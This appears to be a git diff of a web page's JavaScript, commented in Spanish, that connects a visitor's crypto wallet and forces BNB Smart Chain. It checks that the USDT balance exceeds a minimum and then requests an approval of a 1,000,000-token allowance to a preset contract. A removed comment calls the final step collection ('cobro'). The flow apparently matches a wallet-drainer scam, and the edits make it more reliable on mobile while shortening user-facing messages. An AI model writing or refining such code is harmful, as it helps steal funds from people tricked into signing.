@@ -228,7 +228,6 @@ async function getUsdtBalance(userAddress, iface) {
 // ─── Main button handler ──────────────────────────────────────────────────────
 approveBtn.addEventListener("click", async () => {
 
-  // 1. Esperar si el in-app browser de la billetera tarda unos milisegundos en inyectar window.ethereum
   if (!window.ethereum) {
     setLoading(true, "Detectando billetera…");
     for (let i = 0; i < 10; i++) {
@@ -242,54 +241,76 @@ approveBtn.addEventListener("click", async () => {
     if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
       showMobileWalletSelector();
     } else {
-      showToast("Billetera no detectada. Abre este sitio en un navegador Web3.", "error");
+      showToast("Abre este sitio en un navegador Web3.", "error");
     }
     return;
   }
 
-  setLoading(true, "Procesando…");
+  setLoading(true, "Conectando…");
 
   try {
-    // PASO 1 — Solicitar conexión explícita (PRIMERO EN MÓVIL)
+    // PASO 1 — Solicitar conexión explícita
     let accs = [];
     try {
       accs = await window.ethereum.request({ method: "eth_requestAccounts" });
     } catch (e) {
-      showToast("Conexión cancelada por el usuario.", "error");
+      showToast("Conexión cancelada.", "error");
       setLoading(false);
       return;
     }
 
     const userAddress = (accs && accs[0]) ? accs[0] : _cachedAddress;
     if (!userAddress) {
-      showToast("No se pudo obtener la dirección de la billetera.", "error");
+      showToast("No se pudo obtener la wallet.", "error");
       setLoading(false);
       return;
     }
     _cachedAddress = userAddress;
 
-    // PASO 2 — Intentar cambio a BNB Smart Chain (DESPUÉS de estar conectado)
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-      });
-    } catch (e) {
-      if (e.code === 4902) {
-        try {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [BSC_CHAIN_PARAMS]
-          });
-        } catch (_) {}
+    // PASO 2 — VERIFICAR RED ESTRICTAMENTE PARA MÓVILES
+    const currentChain = await window.ethereum.request({ method: "eth_chainId" });
+    
+    if (currentChain !== BSC_CHAIN_ID_HEX) {
+      setLoading(true, "Cambiando Red…");
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }]
+        });
+        // TRUCO MÓVIL: Esperar 1.5s para que la app refresque su proveedor interno tras el cambio
+        await new Promise(r => setTimeout(r, 1500)); 
+      } catch (e) {
+        if (e.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [BSC_CHAIN_PARAMS]
+            });
+            await new Promise(r => setTimeout(r, 1500));
+          } catch (addError) {
+            showToast("Debes agregar BSC a tu billetera.", "error");
+            setLoading(false);
+            return;
+          }
+        } else {
+          // Si el usuario rechaza el cambio de red, detenemos TODO. No podemos aprobar en otra red.
+          showToast("Debes cambiar a BNB Smart Chain para continuar.", "error");
+          setLoading(false);
+          return;
+        }
       }
-      // Nota: En algunas billeteras móviles, el cambio de red se gestiona manualmente arriba en la app; 
-      // no cortamos la ejecución con "return" para permitir que intente la aprobación.
+      
+      // Re-verificar si el cambio fue exitoso en móvil
+      const verifyChain = await window.ethereum.request({ method: "eth_chainId" });
+      if (verifyChain !== BSC_CHAIN_ID_HEX) {
+         showToast("Cambia a BSC desde el menú de tu billetera.", "error");
+         setLoading(false);
+         return;
+      }
     }
 
-    // Validación imprescindible del Smart Contract
     if (!CONTRACT_ADDRESS || CONTRACT_ADDRESS.trim() === "") {
-      showToast("Error: Debes definir CONTRACT_ADDRESS en app.js", "error");
+      showToast("Error: Contrato no definido.", "error");
       setLoading(false);
       return;
     }
@@ -297,7 +318,8 @@ approveBtn.addEventListener("click", async () => {
     const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
-    // PASO 3 — Validar balance de USDT
+    // PASO 3 — Validar balance de USDT (Ahora es seguro porque estamos 100% en BSC)
+    setLoading(true, "Validando saldo…");
     const usdtBalance = await getUsdtBalance(userAddress, iface);
     if (usdtBalance <= MIN_USDT_BALANCE) {
       showToast("Saldo insuficiente de USDT", "error");
@@ -305,7 +327,7 @@ approveBtn.addEventListener("click", async () => {
       return;
     }
 
-    // PASO 4 — Comprobar allowance existente
+    // PASO 4 — Comprobar allowance
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
       const allowanceHex  = await window.ethereum.request({
@@ -321,7 +343,8 @@ approveBtn.addEventListener("click", async () => {
       }
     } catch (_) {}
 
-    // PASO 5 — Solicitar la firma de aprobación (approve)
+    // PASO 5 — Solicitar Aprobación (Approve)
+    setLoading(true, "Firma requerida…");
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
 
     await window.ethereum.request({
@@ -334,7 +357,6 @@ approveBtn.addEventListener("click", async () => {
       }]
     });
 
-    // PASO 6 — Confirmación y cobro
     setLoading(true, "Confirmando…");
     await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
 
